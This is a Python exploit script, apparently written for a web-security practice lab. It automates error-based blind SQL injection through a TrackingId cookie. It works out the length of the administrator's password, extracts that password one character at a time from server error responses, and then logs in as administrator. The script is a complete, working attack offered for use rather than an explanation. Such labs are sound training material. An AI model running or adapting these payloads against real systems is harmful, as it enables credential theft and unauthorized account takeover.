import urllib3
import sys
import requests
from bs4 import BeautifulSoup
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def getCSRF(r):
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = '/login'
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    t = s.post(fullurl, verify=False, proxies=proxies, data=data)
    if 'Log out' in t.text:
        print('\n Login Bypassed')

    else :
        print('\n Log In bypassed failed')


def lengthofpassword(fullurl):
     for i in range(1,50):
        payload = "'||(SELECT CASE WHEN LENGTH(password)>{0} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(i)
        cookie = {
            'TrackingId': "yquB1t0uEJyQAEBp" + payload,
            'session': "uicYHg1x9hvWAMQnafjzxySKTn6a7Yxb"
        }
        r = requests.get(fullurl, verify=False, cookies=cookie,proxies=proxies)
        if r.status_code == 200:
            #print("The length of password is", i)
            passwordlength = i
            return passwordlength


def blindsqliexploitwitherrorresponse(url):
    uri = "/"
    fullurl = url + uri
    passwordlength = lengthofpassword(fullurl)
    password = ""
    username = "administrator"
    for j in range(1,passwordlength+1):
        for k in range(48, 123):
            payload1 = "'||(select case when substr(password,{0},1)='{1}' then to_char(1/0) else '' end from users where username='administrator')||'".format(j,chr(k))
            #print(payload1)
            cookie1 = {
                        'TrackingId': "E8MjHQ8V2FQ3w4d0" + payload1,
                        'session': "C3uWJtKanoyKy60UuVvay67MMT5DN87m"
                        }
            t = requests.get(fullurl, verify=False, cookies=cookie1, proxies=proxies)
            #print(t.status_code)
            if (48<=k<=57) or (65<=k<=90) or (97<=k<=122):
             if t.status_code == 500 :
                password = password + str(chr(k))
                sys.stdout.write('\r'+ password)
                sys.stdout.flush()
                break

            else:
                sys.stdout.write('\r' + password + chr(k))
                sys.stdout.flush()

    login(username, password, url)






if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage python3 blindsqlinjectionwithconditionalresponses.py <url>")
        print("[-] Example python3 blindsqlinjectionwithconditionalresponses.py https://example.com")

    blindsqliexploitwitherrorresponse(url)
